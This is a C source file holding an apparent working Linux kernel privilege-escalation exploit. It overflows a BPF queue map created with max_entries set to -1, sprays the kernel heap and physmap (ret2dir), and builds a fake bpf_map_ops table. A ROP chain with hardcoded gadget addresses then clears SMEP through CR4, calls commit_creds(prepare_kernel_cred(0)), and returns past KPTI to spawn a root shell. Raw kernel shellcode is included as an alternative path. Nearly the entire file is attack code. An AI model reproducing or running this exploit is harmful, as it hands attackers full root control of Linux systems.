#include<stdio.h>
#include<string.h>
#include<linux/bpf.h>
#include<sys/syscall.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/mman.h>

#ifndef BPF_MAP_TYPE_QUEUE
#define BPF_MAP_TYPE_QUEUE 22
#endif

#define XCHG_EAX_ESP 0xffffffff8100e7f8 // xchg eax, esp; ret;
#define POP_RDI_RET 0xffffffff810013e3
#define POP_RDX_RET 0xffffffff81089d39
#define PUSH_RAX_POP_RBP_POP_R12_RET 0xffffffff8132bbe8
#define PUSH_RBP_POP_RDI_RET 0xffffffff813ee2f7
#define FAKE_RSP 0x8100e7f8
#define EVIL_CR4 0x6f0 
#define EFLAGS 0x282
#define NATIVE_WRITE_CR4 0xffffffff8104e70a // mov cr4, rdi; push rdx; popfq; retq;
#define SWAPGS 0xffffffff81c00d5a // swapgs; popfq; retq;
#define IRETQ 0xffffffff81021e52 // iretq; retq;
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00985
#define PREPARE_KERNEL_CRED 0xffffffff81082600
#define COMMIT_CREDS 0xffffffff81082350
#define PHYSMAP 0xffff888001e0e000
//#define PHYSMAP_EXEC 1

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

#define N 1

void kernel_heap_spray(union bpf_attr *attr, uint64_t *spray_map_fd){
	int i = 0;
	for (i = 0; i < N; ++i) {
		spray_map_fd[i] = syscall(__NR_bpf,BPF_MAP_CREATE,attr,0x30);
		printf("[+] map fd: %d\n", spray_map_fd[i]);
	}
	return;
}

void root()
{
    commit_creds(prepare_kernel_cred(0));
}

void shell()
{
    printf("[+] welcome to root :-)\n");
    system("/bin/sh");
}

size_t user_cs, user_ss, user_rflags, user_sp;  //保存用户态寄存器状态
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("user_cs=0x%x, user_ss=0x%x, user_sp=0x%x, user_rflags=0x%x, shell=%p\n", user_cs, user_sp, user_sp, user_rflags, shell);
}

void setupRop(uint64_t *value) {
	void *fake_ops = NULL, *fake_rsp = NULL;
	if((fake_ops =  mmap((void *)0xa000000000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0))==MAP_FAILED){
        	perror("fake_ops mmap failed!");
        	exit(0);
    	}
	*(unsigned long*)(fake_ops) = 0;
	*(unsigned long*)(fake_ops+0x10)= XCHG_EAX_ESP; //栈迁移gadgets,迁移之后rsp = 0x8100e7f8

	*(value + 0) = 0;
	*(value + 1) = 0;
	*(value + 2) = 0;
	*(value + 3) = 0; 
	*(value + 4) = 0; 
	*(value + 5) = 0; 
	printf("[+] set fake bpf_map_ops table.\n");
	//*(value + 6) = fake_ops;
	*(value + 6) = PHYSMAP;

#ifndef PHYSMAP_EXEC
	printf("[+] set kernel rop.\n");
	if((fake_rsp = mmap((void *)(FAKE_RSP-0x7f8),0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0))==MAP_FAILED){
        	perror("fake_rsp mmap failed!");
        	exit(0);
    	}
	printf("[+] fake_rsp: %x\n", fake_rsp + 0x7f8);
	save_status();
	// ret2usr
	//uint64_t rop[14] = {
	//	POP_RDI_RET,
	//	EVIL_CR4, 
	//	POP_RDX_RET,
	//	EFLAGS,
	//	NATIVE_WRITE_CR4,
	//	(size_t)root,
	//	SWAPGS, 
	//	0,
	//	IRETQ,
	//	(size_t)shell,
	//	user_cs,
	//	user_rflags,
	//	user_sp, 
	//	user_ss 	
	//};
	
	//kernel rop to bypass smep.
	//uint64_t rop[20] = {
	//	POP_RDI_RET,
	//	EVIL_CR4, 
	//	POP_RDX_RET,
	//	EFLAGS,
	//	NATIVE_WRITE_CR4,
	//	POP_RDI_RET,
	//	0,
	//	PREPARE_KERNEL_CRED,
	//	PUSH_RAX_POP_RBP_POP_R12_RET,
	//	0,
	//	PUSH_RBP_POP_RDI_RET,
	//	COMMIT_CREDS,
	//	SWAPGS, 
	//	0,
	//	IRETQ,
	//	(size_t)shell,
	//	user_cs,
	//	user_rflags,
	//	user_sp, 
	//	user_ss 	
	//};
	
	// kernel rop to bypass smep and kpti
	uint64_t rop[20] = {
		POP_RDI_RET,
		EVIL_CR4, 
		POP_RDX_RET,
		EFLAGS,
		NATIVE_WRITE_CR4,
		POP_RDI_RET,
		0,
		PREPARE_KERNEL_CRED,
		PUSH_RAX_POP_RBP_POP_R12_RET,
		0,
		PUSH_RBP_POP_RDI_RET,
		COMMIT_CREDS,
		SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE,
		0,
		0,
		(size_t)shell,
		user_cs,
		user_rflags,
		user_sp, 
		user_ss 	
	};
	memcpy((void*)(fake_rsp + 0x7f8), rop, sizeof(rop));
#endif
}

#define spray_times 32*32*32/8
#define SIZE 1024*4    //4k

void 
ret2dir() {
	//size_t slab_addr = 0xffff8880056eec00 & 0xffffffffff000000;
	//printf("[+] slab addr: %p\n", slab_addr);
	void *spray[spray_times];
	int i = 0, j = 0;
	void *mp;
	uint64_t xchg_eax_esp_addr = XCHG_EAX_ESP;
	for(i=0;i<spray_times;i++){    //16k * 1024 = 16M
        	if((mp = mmap(NULL,SIZE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0))==MAP_FAILED){
        		perror("mmap failed!");
        		exit(0);
		}
#ifdef PHYSMAP_EXEC
		uint64_t physmap = (uint64_t*)PHYSMAP+0x20;
		memcpy((uint64_t*)mp+2, &physmap,8);
/* kernel shellcode
 * //mov cr4,0x6f0
 * //mov rdi,cr3
 * //or rdi,0x1000
 * //mov cr3,rdi
 * mov rdi,0x0
 * call 0xffffffff81082600
 * call 0xffffffff81082350
 * push dword 0x821fb7b0
 * push dword 0x821fb7b0
 * push dword 0x206
 * push dword 0x33
 * push dword 0x40134e
 * swapgs
 * iretq
 */
		const unsigned char shellcode[] ="\x00\x00\x00\x00\xbf\x81\x08\x25\xfc\xe8\x81\x08\x23\x4c\xe8\x82\x1f\xb7\xb0\x68\x82\x1f\xb7\xb0\x68\x00\x00\x02\x06\x68\x33\x6a\x00\x40\x13\x4e\x68\xf8\x01\x0f\xcf\x48";
		memcpy((uint64_t *)mp+0x20, shellcode, sizeof(shellcode));
#else
		for(j=0;j<0x3;j++) {
        	    memcpy((uint64_t *)mp+j, &xchg_eax_esp_addr, 8);
        	}
#endif
		spray[i] = mp;          // record mmap addr
		//printf("[+] spray heap %d's addr: %p\n", i+1, mp);
	}
	printf("[+] spray size: 0x%x\n",spray_times*SIZE);

	// use gdb's find command to search phismap addr. e.g. find /g /10 0xffff888001e0e000,0xffffc87fffffffff,(long long int)0xffffffff8100e7f8
	printf("[+] physmap addr: %p\n", PHYSMAP);
}

int main() {
	ret2dir();
	union bpf_attr *attr = (union bpf_attr*)malloc(sizeof(union bpf_attr));
	printf("[+] sizeof(union bpf_attr): 0x%x\n", sizeof(union bpf_attr));
	printf("[+] sizeof(struct bpf_map): 0x%x\n", 0xc0);
	printf("[+] sizeof(struct bpf_queue_stack): 0x%x\n", 0x100);
	attr->map_type = BPF_MAP_TYPE_QUEUE;    //BPF_MAP_TYPE_QUEUE
	attr->max_entries = -1;
	attr->map_flags = 0;
	attr->value_size = 0x40;
	int targetFd = syscall(__NR_bpf,BPF_MAP_CREATE,attr,0x30);
	printf("[+] bpf targetFd: %d\n", targetFd);
	
	uint64_t spray_map_fd[N];
	kernel_heap_spray(attr, spray_map_fd);
	uint64_t value[7];
	setupRop(value);

	union bpf_attr *attr1 = (union bpf_attr*)malloc(sizeof(union bpf_attr));
	attr1->map_fd = targetFd;
	attr1->value = value;
	attr1->value_size = 0x40;
	attr1->key = 0;
	attr1->flags = 2;
	syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, attr1, 0x30);
	
	int i = 0;
	printf("[+] start closing map fd\n");
	for (i = 0; i < N; ++i)
		close(spray_map_fd[i]);
	printf("[+] end closing map fd\n");
	return 0;
}
